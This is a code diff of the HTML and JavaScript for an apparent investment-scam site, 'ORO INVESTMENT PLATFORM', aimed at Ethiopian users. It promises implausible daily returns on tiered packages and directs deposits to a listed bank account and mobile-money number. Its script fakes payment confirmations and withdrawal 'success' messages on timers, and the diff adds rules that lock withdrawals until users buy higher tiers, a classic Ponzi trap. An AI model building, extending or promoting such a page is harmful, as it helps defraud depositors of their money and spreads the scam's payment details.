@@ -9,12 +9,10 @@
     body { background-color: #0d0e12; color: #ffffff; padding: 12px; display: flex; flex-direction: column; align-items: center; }
     .container { width: 100%; max-width: 440px; }
     
-    /* Header & Logo */
     .header { text-align: center; margin-bottom: 15px; }
     .app-logo { width: 90px; height: 90px; border-radius: 50%; border: 2px solid #ffd700; margin-bottom: 8px; box-shadow: 0 0 10px rgba(255, 215, 0, 0.4); display: inline-block; }
     .header h1 { color: #ffd700; font-size: 20px; font-weight: 800; letter-spacing: 0.5px; }
 
-    /* Balance Dashboard Card */
     .balance-card { background: #15171e; border: 1px solid #ffd700; border-radius: 14px; padding: 15px; text-align: center; margin-bottom: 15px; }
     .balance-grid { display: flex; justify-content: space-between; margin-bottom: 15px; background: #0d0e12; padding: 10px; border-radius: 10px; }
     .balance-item { flex: 1; }
@@ -26,19 +24,15 @@
     .btn-recharge { background-color: #28a745; color: #ffffff; }
     .btn-withdraw { background-color: #dc3545; color: #ffffff; }
 
-    /* Status Alert Banner */
     .status-banner { display: none; background: #1c2333; border: 1px solid #ffd700; color: #ffd700; padding: 10px; border-radius: 8px; margin-bottom: 12px; font-size: 12px; font-weight: bold; text-align: center; }
 
-    /* Filter Tiers */
     .filter-tabs { display: flex; gap: 6px; margin-bottom: 15px; }
-    .filter-btn { flex: 1; padding: 10px 4px; background: #15171e; border: 1px solid #ffd700; color: #ffffff; border-radius: 8px; font-size: 11px; font-weight: 600; cursor: pointer; text-align: center; }
+    .filter-btn { flex: 1; padding: 10px 4px; background: #15171e; border: 1px solid #ffd700; color: #ffffff; border-radius: 8px; font-size: 10px; font-weight: 600; cursor: pointer; text-align: center; }
     .filter-btn.active { background: #ffd700; color: #000000; }
 
-    /* Category Content Sections */
     .tab-content { display: none; }
     .tab-content.active { display: block; }
 
-    /* Product Cards */
     .package-card { background: #15171e; border-radius: 12px; padding: 12px; margin-bottom: 12px; border: 1px solid #252830; display: flex; align-items: center; justify-content: space-between; gap: 10px; }
     .package-img { width: 55px; height: 55px; border-radius: 10px; background: #222; display: flex; align-items: center; justify-content: center; font-size: 28px; border: 1px solid #333; }
     .package-info { flex: 1; }
@@ -47,7 +41,6 @@
     .badge { background: #2d2600; color: #ffd700; font-size: 10px; padding: 2px 6px; border-radius: 4px; border: 1px solid #ffd700; display: inline-block; margin-top: 2px; }
     .btn-invest { background: #ffd700; color: #000000; border: none; padding: 8px 14px; border-radius: 6px; font-weight: bold; font-size: 12px; cursor: pointer; }
 
-    /* Modals (Registration, Recharge, Withdrawal) */
     .modal-overlay { position: fixed; top:0; left:0; width:100vw; height:100vh; background: rgba(0,0,0,0.85); display: flex; align-items: center; justify-content: center; z-index: 9999; }
     .modal-box { background: #15171e; border: 1px solid #ffd700; padding: 20px; border-radius: 12px; width: 90%; max-width: 360px; text-align: center; }
     .modal-box h2 { color: #ffd700; font-size: 18px; margin-bottom: 12px; }
@@ -55,65 +48,57 @@
     .modal-btn { width: 100%; padding: 10px; background: #ffd700; color: #000; font-weight: bold; border: none; border-radius: 6px; margin-top: 10px; cursor: pointer; }
     .rule-box { text-align: left; background: #0d0e12; padding: 10px; border-radius: 6px; font-size: 11px; color: #aaa; margin: 10px 0; line-height: 1.4; border-left: 3px solid #ffd700; }
 
-    /* Support Section */
     .section-title { color: #ffd700; font-size: 14px; font-weight: bold; margin: 15px 0 8px 0; }
     .support-btn { width: 100%; background: #15171e; border: 1px solid #252830; color: #ffffff; padding: 12px; border-radius: 8px; margin-bottom: 8px; font-size: 12px; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 8px; text-decoration: none; }
   </style>
 </head>
 <body>
 
-<!-- Registration Modal -->
 <div id="regModal" class="modal-overlay">
   <div class="modal-box">
     <h2>ORO INVESTMENT</h2>
     <p style="font-size: 12px; color: #aaa; margin-bottom: 10px;">Sign in or Register to continue</p>
-    <input type="text" id="regName" placeholder="Full Name">
     <input type="tel" id="regPhone" placeholder="Mobile Number (e.g. 09...)">
     <input type="password" id="regPin" maxlength="6" placeholder="6-Digit Security Code/PIN">
     <button class="modal-btn" onclick="registerUser()">Register / Login</button>
   </div>
 </div>
 
-<!-- Recharge Modal -->
 <div id="rechargeModal" class="modal-overlay" style="display:none;">
   <div class="modal-box">
     <h2>Recharge Wallet</h2>
     <div class="rule-box">
       <strong>Payment Options:</strong><br>
-      • CBE Bank: <code>1000609844292</code> (Geleta Adem)<br>
-      • Telebirr: <code>0941470214</code> (Geleta Adem)<br>
-      • CBE Birr: <code>0941470214</code> (Geleta Adem)
+      • Methods: Bank, Telebirr, CBE Birr<br>
+      • CBE Account: <code>1000609844292</code><br>
+      • Telebirr / CBE Birr: <code>0941470214</code>
     </div>
     <input type="number" id="rechargeAmount" placeholder="Amount (ETB)">
-    <p style="font-size:11px; color:#aaa; margin-top:5px; text-align:left;">Upload Payment Receipt (Image):</p>
+    <p style="font-size:11px; color:#aaa; margin-top:5px; text-align:left;">Upload Payment Receipt:</p>
     <input type="file" id="rechargeProof" accept="image/*">
     <button class="modal-btn" onclick="submitRecharge()">Submit Payment</button>
     <button class="modal-btn" style="background:#444; color:#fff; margin-top:5px;" onclick="closeModal('rechargeModal')">Cancel</button>
   </div>
 </div>
 
-<!-- Withdrawal Modal -->
 <div id="withdrawModal" class="modal-overlay" style="display:none;">
   <div class="modal-box">
     <h2>Withdrawal Request</h2>
     <div class="rule-box">
-      • Bank Choice: <strong>CBE Only</strong><br>
-      • Limit: 600 ETB - 30,000 ETB<br>
-      • Frequency: Once per 24 hours.<br>
-      • Tiers 1 & 2 process time: 48 hours.<br>
-      • Mineral VIP process time: 24 hours.
+      • Bank: <strong>CBE Only</strong><br>
+      • Tier 1 & 2 process: 48 hours.<br>
+      • Mineral VIP process: 24 hours.
     </div>
     <select id="wBank"><option>Commercial Bank of Ethiopia (CBE)</option></select>
     <input type="text" id="wAccName" placeholder="Account Holder Name">
     <input type="text" id="wAccNum" placeholder="CBE Account Number">
-    <input type="number" id="wAmount" placeholder="Amount (600 - 30,000 ETB)">
+    <input type="number" id="wAmount" placeholder="Amount (ETB)">
     <button class="modal-btn" onclick="submitWithdrawal()">Request Withdrawal</button>
     <button class="modal-btn" style="background:#444; color:#fff; margin-top:5px;" onclick="closeModal('withdrawModal')">Cancel</button>
   </div>
 </div>
 
 <div class="container">
-  <!-- Header with ORO INVESTMENT Logo -->
   <div class="header">
     <svg class="app-logo" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
       <circle cx="100" cy="100" r="95" fill="#0d0e12" stroke="#ffd700" stroke-width="6"/>
@@ -125,10 +110,8 @@
     <h1>ORO INVESTMENT PLATFORM</h1>
   </div>
 
-  <!-- Status Alert Banner -->
   <div id="statusBanner" class="status-banner"></div>
 
-  <!-- Balance Dashboard -->
   <div class="balance-card">
     <div class="balance-grid">
       <div class="balance-item">
@@ -150,7 +133,6 @@
     </div>
   </div>
 
-  <!-- Referral Section -->
   <div class="balance-card" style="padding:10px; margin-bottom:15px; text-align:left;">
     <p style="font-size:11px; color:#aaa;">Invite Friends & Earn <strong>15 ETB</strong> per referral!</p>
     <div style="display:flex; gap:5px; margin-top:5px;">
@@ -159,103 +141,190 @@
     </div>
   </div>
 
-  <!-- Filter Tiers -->
   <div class="filter-tabs">
-    <button class="filter-btn active" onclick="switchTab('tier1', this)">Tier 1 Packages</button>
-    <button class="filter-btn" onclick="switchTab('tier2', this)">Tier 2 Packages</button>
+    <button class="filter-btn active" onclick="switchTab('tier1', this)">Tier 1 Projects</button>
+    <button class="filter-btn" onclick="switchTab('tier2', this)">Tier 2 Projects</button>
     <button class="filter-btn" onclick="switchTab('vip', this)">Mineral VIPs</button>
   </div>
 
-  <!-- Tier 1 Packages Section -->
   <div id="tier1" class="tab-content active">
+    <div class="package-card">
+      <div class="package-img">🥚</div>
+      <div class="package-info">
+        <h3>Egg</h3>
+        <p>Price: 280 ETB | Daily: 46 ETB</p>
+        <p>Days: 15 | Total: 690 ETB</p>
+        <span class="badge">5% Commission</span>
+      </div>
+      <button class="btn-invest" onclick="buyPkg(280, 1)">Invest</button>
+    </div>
+    <div class="package-card">
+      <div class="package-img">🥛</div>
+      <div class="package-info">
+        <h3>Milk</h3>
+        <p>Price: 350 ETB | Daily: 49 ETB</p>
+        <p>Days: 19 | Total: 931 ETB</p>
+        <span class="badge">10% Commission</span>
+      </div>
+      <button class="btn-invest" onclick="buyPkg(350, 1)">Invest</button>
+    </div>
+    <div class="package-card">
+      <div class="package-img">🥣</div>
+      <div class="package-info">
+        <h3>Yogurt</h3>
+        <p>Price: 450 ETB | Daily: 58 ETB</p>
+        <p>Days: 29 | Total: 1,682 ETB</p>
+        <span class="badge">15% Commission</span>
+      </div>
+      <button class="btn-invest" onclick="buyPkg(450, 1)">Invest</button>
+    </div>
+    <div class="package-card">
+      <div class="package-img">🌴</div>
+      <div class="package-info">
+        <h3>Date</h3>
+        <p>Price: 600 ETB | Daily: 65 ETB</p>
+        <p>Days: 33 | Total: 2,145 ETB</p>
+        <span class="badge">20% Commission</span>
+      </div>
+      <button class="btn-invest" onclick="buyPkg(600, 1)">Invest</button>
+    </div>
+    <div class="package-card">
+      <div class="package-img">🥑</div>
+      <div class="package-info">
+        <h3>Avocado</h3>
+        <p>Price: 784 ETB | Daily: 85 ETB</p>
+        <p>Days: 35 | Total: 2,975 ETB</p>
+        <span class="badge">25% Commission</span>
+      </div>
+      <button class="btn-invest" onclick="buyPkg(784, 1)">Invest</button>
+    </div>
+  </div>
+
+  <div id="tier2" class="tab-content">
+    <div class="package-card">
+      <div class="package-img">🐔</div>
+      <div class="package-info">
+        <h3>Poultry</h3>
+        <p>Price: 550 ETB | Daily: 60 ETB</p>
+        <p>Days: 25 | Total: 1,500 ETB</p>
+        <span class="badge">5% Commission</span>
+      </div>
+      <button class="btn-invest" onclick="buyPkg(550, 2)">Invest</button>
+    </div>
+    <div class="package-card">
+      <div class="package-img">🐐</div>
+      <div class="package-info">
+        <h3>Goat</h3>
+        <p>Price: 800 ETB | Daily: 100 ETB</p>
+        <p>Days: 30 | Total: 3,000 ETB</p>
+        <span class="badge">10% Commission</span>
+      </div>
+      <button class="btn-invest" onclick="buyPkg(800, 2)">Invest</button>
+    </div>
+    <div class="package-card">
+      <div class="package-img">🐂</div>
+      <div class="package-info">
+        <h3>Cattle</h3>
+        <p>Price: 1,200 ETB | Daily: 120 ETB</p>
+        <p>Days: 35 | Total: 4,200 ETB</p>
+        <span class="badge">15% Commission</span>
+      </div>
+      <button class="btn-invest" onclick="buyPkg(1200, 2)">Invest</button>
+    </div>
+    <div class="package-card">
+      <div class="package-img">🐎</div>
+      <div class="package-info">
+        <h3>Horse</h3>
+        <p>Price: 1,500 ETB | Daily: 150 ETB</p>
+        <p>Days: 40 | Total: 6,000 ETB</p>
+        <span class="badge">20% Commission</span>
+      </div>
+      <button class="btn-invest" onclick="buyPkg(1500, 2)">Invest</button>
+    </div>
+    <div class="package-card">
+      <div class="package-img">🐪</div>
+      <div class="package-info">
+        <h3>Camel</h3>
+        <p>Price: 3,000 ETB | Daily: 180 ETB</p>
+        <p>Days: 50 | Total: 9,000 ETB</p>
+        <span class="badge">25% Commission</span>
+      </div>
+      <button class="btn-invest" onclick="buyPkg(3000, 2)">Invest</button>
+    </div>
+  </div>
+
+  <div id="vip" class="tab-content">
     <div class="package-card">
       <div class="package-img">🥇</div>
       <div class="package-info">
         <h3>VIP 1 : Gold</h3>
-        <p>Price: 500 ETB | Daily: 150 ETB</p>
-        <p>Days: 15 | Total: 2,250 ETB</p>
-        <span class="badge">VIP Level 1</span>
+        <p>Price: 4,000 ETB | Daily: 650 ETB</p>
+        <p>Days: 15 | Total: 9,750 ETB</p>
+        <span class="badge">30% Commission</span>
       </div>
-      <button class="btn-invest" onclick="buyPkg(500)">Invest</button>
+      <button class="btn-invest" onclick="buyPkg(4000, 3)">Invest</button>
     </div>
     <div class="package-card">
       <div class="package-img">🧪</div>
       <div class="package-info">
         <h3>VIP 2 : Mercury</h3>
-        <p>Price: 1,500 ETB | Daily: 350 ETB</p>
-        <p>Days: 25 | Total: 8,750 ETB</p>
-        <span class="badge">VIP Level 2</span>
+        <p>Price: 6,000 ETB | Daily: 1,000 ETB</p>
+        <p>Days: 15 | Total: 15,000 ETB</p>
+        <span class="badge">40% Commission</span>
       </div>
-      <button class="btn-invest" onclick="buyPkg(1500)">Invest</button>
+      <button class="btn-invest" onclick="buyPkg(6000, 3)">Invest</button>
     </div>
     <div class="package-card">
       <div class="package-img">🟢</div>
       <div class="package-info">
         <h3>VIP 3 : Jade</h3>
-        <p>Price: 2,500 ETB | Daily: 455 ETB</p>
-        <p>Days: 33 | Total: 15,000 ETB</p>
-        <span class="badge">VIP Level 3</span>
+        <p>Price: 8,000 ETB | Daily: 1,250 ETB</p>
+        <p>Days: 15 | Total: 18,750 ETB</p>
+        <span class="badge">50% Commission</span>
       </div>
-      <button class="btn-invest" onclick="buyPkg(2500)">Invest</button>
+      <button class="btn-invest" onclick="buyPkg(8000, 3)">Invest</button>
     </div>
     <div class="package-card">
       <div class="package-img">💎</div>
       <div class="package-info">
         <h3>VIP 4 : Emerald</h3>
-        <p>Price: 3,500 ETB | Daily: 550 ETB</p>
-        <p>Days: 45 | Total: 24,750 ETB</p>
-        <span class="badge">VIP Level 4</span>
+        <p>Price: 10,000 ETB | Daily: 1,500 ETB</p>
+        <p>Days: 15 | Total: 22,500 ETB</p>
+        <span class="badge">75% Commission</span>
       </div>
-      <button class="btn-invest" onclick="buyPkg(3500)">Invest</button>
+      <button class="btn-invest" onclick="buyPkg(10000, 3)">Invest</button>
     </div>
-  </div>
-
-  <!-- Tier 2 Packages Section -->
-  <div id="tier2" class="tab-content">
     <div class="package-card">
       <div class="package-img">👑</div>
       <div class="package-info">
         <h3>VIP 5 : Diamond</h3>
-        <p>Price: 6,500 ETB | Daily: 950 ETB</p>
-        <p>Days: 45 | Total: 38,000 ETB</p>
-        <span class="badge">VIP Level 5</span>
+        <p>Price: 15,000 ETB | Daily: 2,500 ETB</p>
+        <p>Days: 18 | Total: 45,000 ETB</p>
+        <span class="badge">100% Commission</span>
       </div>
-      <button class="btn-invest" onclick="buyPkg(6500)">Invest</button>
+      <button class="btn-invest" onclick="buyPkg(15000, 3)">Invest</button>
     </div>
   </div>
 
-  <!-- Mineral VIP Section -->
-  <div id="vip" class="tab-content">
-    <div class="package-card">
-      <div class="package-img">🏆</div>
-      <div class="package-info">
-        <h3>VIP Platinum</h3>
-        <p>Price: 10,000 ETB | Daily: 1,600 ETB</p>
-        <p>Days: 50 | Total: 80,000 ETB</p>
-        <span class="badge">VIP Platinum</span>
-      </div>
-      <button class="btn-invest" onclick="buyPkg(10000)">Invest</button>
-    </div>
-  </div>
-
-  <!-- Terms & App Rules -->
   <div class="rule-box" style="margin-top:20px;">
     <strong>App Rules & Anti-Fraud Policy:</strong><br>
     1. Attempting to defame or misuse the application will result in immediate account termination.<br>
-    2. Withdrawal processing time takes 24 to 48 hours.<br>
-    3. Payment proof must be uploaded instantly.
+    2. Withdrawal processing time: Tier 1 & 2 takes 48 hours, Mineral VIP takes 24 hours.<br>
+    3. Mandatory progression: Tier 1 complete requires Tier 2 purchase; Tier 2 requires VIP 3.<br>
+    4. Payment proof must be uploaded instantly.
   </div>
 
-  <!-- Support Section -->
   <div class="section-title">Support & Official Links</div>
-  <a href="https://t.me/orotechA30" target="_blank" class="support-btn">📢 Official Telegram Channel</a>
+  <a href="https://t.me/OroInvestmentofficial" target="_blank" class="support-btn">📢 Official Telegram Channel</a>
   <a href="https://t.me/OroinvestAdmin" target="_blank" class="support-btn">👤 Contact Admin (@OroinvestAdmin)</a>
 </div>
 
 <script>
   let rBalance = 0.00;
   let wBalance = 0.00;
-  let lastWithdrawal = 0;
+  let hasTier1 = false;
+  let hasTier2 = false;
+  let hasVip3 = false;
 
   function showStatus(message, color = "#ffd700") {
     let banner = document.getElementById('statusBanner');
@@ -266,11 +335,10 @@
   }
 
   function registerUser() {
-    let name = document.getElementById('regName').value;
     let phone = document.getElementById('regPhone').value;
     let pin = document.getElementById('regPin').value;
 
-    if (name && phone && pin.length === 6) {
+    if (phone && pin.length === 6) {
       document.getElementById('regModal').style.display = 'none';
       alert('Registration successful! Welcome to ORO INVESTMENT PLATFORM.');
     } else {
@@ -294,54 +362,58 @@
     
     if(amt && proof) {
       closeModal('rechargeModal');
-      showStatus("⏳ Your payment processing...", "#ffd700");
+      showStatus("Your payment processing...", "#ffd700");
       alert('Your payment processing...');
 
       setTimeout(() => {
         rBalance += amt;
         document.getElementById('r-bal').innerText = rBalance.toFixed(2);
-        showStatus("✅ Your payment Successful!", "#28a745");
+        showStatus("Your payment Successful!", "#28a745");
         alert('Your payment Successful!');
       }, 4000);
     } else {
-      alert('Please enter amount and upload payment receipt image!');
+      alert('Please enter amount and upload payment receipt!');
     }
   }
 
   function submitWithdrawal() {
     let amt = parseFloat(document.getElementById('wAmount').value);
-    let now = new Date().getTime();
 
-    if (now - lastWithdrawal < 86400000) {
-      alert('Withdrawal limit reached! You can only request withdrawal ONCE every 24 hours.');
+    if (hasTier1 && !hasTier2) {
+      alert('Withdrawal locked! You must purchase a Tier 2 package to withdraw after completing Tier 1.');
       return;
     }
-    if (amt < 600 || amt > 30000) {
-      alert('Withdrawal amount must be between 600 ETB and 30,000 ETB!');
+    if (hasTier2 && !hasVip3) {
+      alert('Withdrawal locked! You must purchase VIP 3 (Jade) to withdraw after completing Tier 2.');
       return;
     }
-    if (amt > wBalance) {
-      alert('Insufficient withdrawable balance!');
+
+    if (amt > wBalance || amt <= 0) {
+      alert('Insufficient or invalid withdrawable balance!');
       return;
     }
 
     closeModal('withdrawModal');
-    showStatus("⏳ Your withdrawal processing...", "#ffd700");
+    showStatus("Your withdrawal processing...", "#ffd700");
     alert('Your withdrawal processing...');
 
     setTimeout(() => {
       wBalance -= amt;
       document.getElementById('w-bal').innerText = wBalance.toFixed(2);
-      lastWithdrawal = now;
-      showStatus("🎉 Congratulations! Your withdrawal Successful!", "#28a745");
+      showStatus("Congratulations! Your withdrawal Successful!", "#28a745");
       alert('Congratulations! Your withdrawal Successful!');
     }, 4000);
   }
 
-  function buyPkg(price) {
+  function buyPkg(price, tierLevel) {
     if (rBalance >= price) {
       rBalance -= price;
       document.getElementById('r-bal').innerText = rBalance.toFixed(2);
+      
+      if(tierLevel === 1) hasTier1 = true;
+      if(tierLevel === 2) hasTier2 = true;
+      if(tierLevel === 3 && price >= 8000) hasVip3 = true;
+
       alert('Investment successful!');
     } else {
       alert('Insufficient Recharge Balance! Please recharge your wallet first.');
